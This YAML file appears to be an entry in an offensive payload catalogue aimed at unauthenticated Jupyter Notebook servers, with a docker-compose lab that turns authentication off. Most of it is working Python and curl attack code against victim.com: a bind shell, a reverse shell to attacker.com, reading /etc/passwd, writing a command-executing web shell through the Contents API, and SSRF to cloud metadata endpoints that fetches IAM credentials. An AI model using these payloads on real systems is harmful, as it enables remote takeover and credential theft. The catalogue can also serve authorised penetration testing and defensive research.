---
comment: "Jupyter Notebook is a Python-based interactive computing environment commonly\
  \ deployed\nin data science, ML, and research stacks. When launched without authentication\n\
  (--NotebookApp.token='' --NotebookApp.password=''), the full REST API is accessible\n\
  to anyone with network access \u2014 including kernel execution and terminal sessions.\n\
  \nTwo exploitation surfaces exist regardless of whether a token is set:\n1. Kernel\
  \ API (/api/kernels) \u2014 creates a Python kernel and executes arbitrary code\
  \ via\n   WebSocket. The executing user is whoever started the Jupyter process (frequently\
  \ root\n   in Docker/Kubernetes deployments).\n2. Terminal API (/api/terminals)\
  \ \u2014 spawns a full interactive shell session over WebSocket\n   when the terminal\
  \ feature is enabled (default). Requires websocat or wscat on the\n   attacker machine\
  \ to communicate.\n\nPayloads below use the kernel API with the websocket-client\
  \ Python package, which works\nagainst both classic Notebook and JupyterLab. Install\
  \ with: pip install requests websocket-client\n"
docker:
  compose: "services:\n  jupyter:\n    image: jupyter/minimal-notebook:latest\n  \
    \  ports:\n      - \"8888:8888\"\n    command: >\n      start-notebook.sh\n  \
    \    --NotebookApp.token=''\n      --NotebookApp.password=''\n      --NotebookApp.allow_origin='*'\n"
  note: "Starts a Jupyter Notebook server with authentication completely disabled\
    \ \u2014 no token,\nno password. Access at `http://localhost:8888`. All kernel\
    \ execution, file read/write,\nand terminal endpoints are available without credentials,\
    \ matching the `unauthenticated`\ncontext in every entry above.\n"
functions:
  bind-shell:
  - code: |
      import requests, json, uuid, websocket

      BASE = "http://victim.com"
      kid = requests.post(f"{BASE}/api/kernels",
          headers={"Content-Type": "application/json"}).json()["id"]

      ws = websocket.create_connection(f"ws://victim.com/api/kernels/{kid}/channels")
      ws.send(json.dumps({
          "header": {"msg_id": uuid.uuid4().hex, "username": "", "session": "",
                     "msg_type": "execute_request", "version": "5.0"},
          "parent_header": {}, "metadata": {}, "buffers": [], "channel": "shell",
          "content": {
              "code": ("import socket,subprocess\n"
                       "s=socket.socket()\n"
                       "s.bind(('0.0.0.0',12345))\n"
                       "s.listen(1)\n"
                       "c,_=s.accept()\n"
                       "subprocess.call(['/bin/sh'],stdin=c,stdout=c,stderr=c)"),
              "silent": True
          }
      }))
      ws.close()
    comment: "Binds a shell to TCP port 12345 on the Jupyter server. The WebSocket\
      \ is closed\nafter sending \u2014 the kernel blocks waiting for a connection.\
      \ Inbound firewall rules\non the target host may block the port.\n"
    connector: tcp-client
    contexts:
      unauthenticated:
    tty: false
  file-read:
  - code: |
      import requests, json, uuid, websocket

      BASE = "http://victim.com"
      kid = requests.post(f"{BASE}/api/kernels",
          headers={"Content-Type": "application/json"}).json()["id"]

      ws = websocket.create_connection(f"ws://victim.com/api/kernels/{kid}/channels")
      ws.send(json.dumps({
          "header": {"msg_id": uuid.uuid4().hex, "username": "", "session": "",
                     "msg_type": "execute_request", "version": "5.0"},
          "parent_header": {}, "metadata": {}, "buffers": [], "channel": "shell",
          "content": {"code": "print(open('/etc/passwd').read())", "silent": False}
      }))
      while True:
          m = json.loads(ws.recv())
          if m.get("msg_type") == "stream":
              print(m["content"]["text"]); break
          if m.get("msg_type") in ("execute_reply", "error"):
              break
      ws.close()
    comment: |
      Reads an arbitrary file via Python's open() executed inside the kernel. The file
      content is returned in the stream iopub message. The kernel process must have read
      permission on the target path.
    contexts:
      unauthenticated:
  file-write:
  - code: |
      # Write a file via the Jupyter Contents API (path relative to --notebook-dir)
      curl -X PUT "http://victim.com/api/contents/shell.py" \
        -H "Content-Type: application/json" \
        -d '{"type":"file","format":"text","content":"import subprocess,sys\nsys.stdout.write(subprocess.check_output(sys.argv[1],shell=True).decode())\n"}'
    comment: "The Contents API allows writing arbitrary files under the Jupyter notebook\
      \ directory\n(--notebook-dir, default ~/). The written Python script can then\
      \ be executed via\nthe kernel API or the terminal. Adjust the path to land in\
      \ a useful location.\nTo overwrite an existing file, a prior GET to /api/contents/<path>\
      \ is not needed \u2014\nPUT creates or replaces without precondition.\n"
    contexts:
      unauthenticated:
  rce:
  - code: |
      import requests, json, uuid, websocket

      BASE = "http://victim.com"

      # Start a Python kernel
      kid = requests.post(f"{BASE}/api/kernels",
          headers={"Content-Type": "application/json"}).json()["id"]

      # Connect to the kernel channel
      ws = websocket.create_connection(f"ws://victim.com/api/kernels/{kid}/channels")

      # Send execute_request with an OS command
      ws.send(json.dumps({
          "header": {"msg_id": uuid.uuid4().hex, "username": "", "session": "",
                     "msg_type": "execute_request", "version": "5.0"},
          "parent_header": {}, "metadata": {}, "buffers": [], "channel": "shell",
          "content": {
              "code": "import subprocess; print(subprocess.check_output('id', shell=True).decode())",
              "silent": False
          }
      }))

      # Read output from iopub messages
      while True:
          m = json.loads(ws.recv())
          if m.get("msg_type") == "stream":
              print(m["content"]["text"]); break
          if m.get("msg_type") in ("execute_reply", "error"):
              break
      ws.close()
    comment: |
      Creates a Python kernel via the /api/kernels endpoint and executes an OS command
      by sending an execute_request message over WebSocket. Command output is returned
      in a stream iopub message. The kernel runs as the Jupyter process user.

      When a token is required, add headers={"Authorization": f"token {TOKEN}"} to
      the requests.post() call and the websocket URL:
        ws://victim.com/api/kernels/{kid}/channels?token={TOKEN}
    contexts:
      unauthenticated:
  reverse-shell:
  - blind: true
    code: |
      import requests, json, uuid, websocket

      BASE = "http://victim.com"
      kid = requests.post(f"{BASE}/api/kernels",
          headers={"Content-Type": "application/json"}).json()["id"]

      ws = websocket.create_connection(f"ws://victim.com/api/kernels/{kid}/channels")
      ws.send(json.dumps({
          "header": {"msg_id": uuid.uuid4().hex, "username": "", "session": "",
                     "msg_type": "execute_request", "version": "5.0"},
          "parent_header": {}, "metadata": {}, "buffers": [], "channel": "shell",
          "content": {
              "code": ("import socket,os,subprocess\n"
                       "s=socket.socket()\n"
                       "s.connect(('attacker.com',12345))\n"
                       "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)\n"
                       "subprocess.call(['/bin/sh','-i'])"),
              "silent": True
          }
      }))
      ws.close()
    comment: "Executes a Python socket reverse shell inside the Jupyter kernel. The\
      \ WebSocket\nis closed immediately after sending \u2014 the kernel keeps the\
      \ shell alive independently.\nThe shell runs as the Jupyter process user (often\
      \ root in container deployments).\n"
    contexts:
      unauthenticated:
    listener: tcp-server
    tty: false
  ssrf:
  - code: |
      import requests, json, uuid, websocket

      BASE = "http://victim.com"
      kid = requests.post(f"{BASE}/api/kernels",
          headers={"Content-Type": "application/json"}).json()["id"]

      ws = websocket.create_connection(f"ws://victim.com/api/kernels/{kid}/channels")
      ws.send(json.dumps({
          "header": {"msg_id": uuid.uuid4().hex, "username": "", "session": "",
                     "msg_type": "execute_request", "version": "5.0"},
          "parent_header": {}, "metadata": {}, "buffers": [], "channel": "shell",
          "content": {
              "code": ("import urllib.request\n"
                       "r = urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/')\n"
                       "print(r.read().decode())"),
              "silent": False
          }
      }))
      while True:
          m = json.loads(ws.recv())
          if m.get("msg_type") == "stream":
              print(m["content"]["text"]); break
          if m.get("msg_type") in ("execute_reply", "error"):
              break
      ws.close()
    comment: "The Jupyter kernel executes arbitrary Python, including outbound HTTP\
      \ requests via\nurllib or requests. This makes the kernel API a full SSRF primitive\
      \ \u2014 the request\noriginates from the Jupyter server host, which typically\
      \ has access to:\n- AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\
      - GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n\
      - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01\n\n\
      Response content is returned in the stream iopub message. No additional credentials\n\
      are needed when Jupyter runs without token authentication (--NotebookApp.token='').\n"
    contexts:
      unauthenticated:
